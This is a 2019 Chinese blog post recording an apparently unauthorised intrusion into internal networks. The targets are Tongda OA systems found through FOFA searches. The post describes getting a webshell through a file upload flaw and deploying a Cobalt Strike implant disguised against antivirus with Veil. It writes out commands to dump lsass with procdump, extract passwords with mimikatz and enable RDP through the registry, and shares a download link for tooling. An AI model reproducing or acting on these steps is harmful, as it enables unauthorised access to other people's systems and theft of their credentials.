---
layout: post
title: 内网：记一次内网渗透
date: 2019-10-06
categories: blog
tags: [内网，mimikatz，procdump]
description: 内网渗透
---

#### 一、获取目标
- fofa搜索`title="网络智能管理系统"`，`app="通达OA"`
- 通过通达oa文件上传漏洞获取webshell
#### 二、操作
- 蚁剑管上

- 上传veil CS免杀的远控exe，命令行执行，反弹成功
![](https://upload-images.jianshu.io/upload_images/15634342-eb3d43d8f0e55b88.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

- 直接CS run mimikatz，获取用户名密码

- 或者上传Procdump.exe
`procdump64.exe -accepteula -ma lsass.exe lsass.dmp`
- 将lsass.dmp下载到本地执行
`mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit`
- 解出密码
链接：https://pan.baidu.com/s/1gNc9qLcNSNBohIVrAiqShw 密码：fc38

- 该机器直接就是system权限，然而该机器有数字套餐，命令行开启3389失败
执行开启3389端口`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`
- 执行关闭3389端口`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f`

- 思路：上传teamviewer一键安装版，上传读取tv密码的脚本，读取密码。用tv连












